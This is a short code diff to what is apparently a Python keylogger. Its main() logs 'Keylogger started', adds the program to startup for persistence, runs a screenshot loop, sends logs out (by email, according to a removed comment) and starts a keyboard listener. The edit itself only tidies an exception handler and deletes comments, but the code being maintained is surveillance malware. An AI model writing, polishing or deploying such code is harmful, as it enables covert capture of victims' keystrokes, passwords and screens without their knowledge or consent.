@@ -32,7 +32,7 @@ def log_debug(message):
     try:
         with open(DEBUG_LOG_FILE, "a", encoding="utf-8") as f:
             f.write(f"[{datetime.now()}] {message}\n")
-    except:
+    except Exception:
         pass  # Fail silently if debug logging breaks
 
 # === STARTUP PERSISTENCE ===
@@ -123,11 +123,9 @@ def main():
     log_debug("=== Keylogger started ===")
     add_to_startup()
 
-    # Start periodic screenshot and email sending
     screenshot_loop()
     send_logs()
 
-    # Start keylogger listener (blocking)
     with keyboard.Listener(on_press=on_press) as listener:
         listener.join()
 
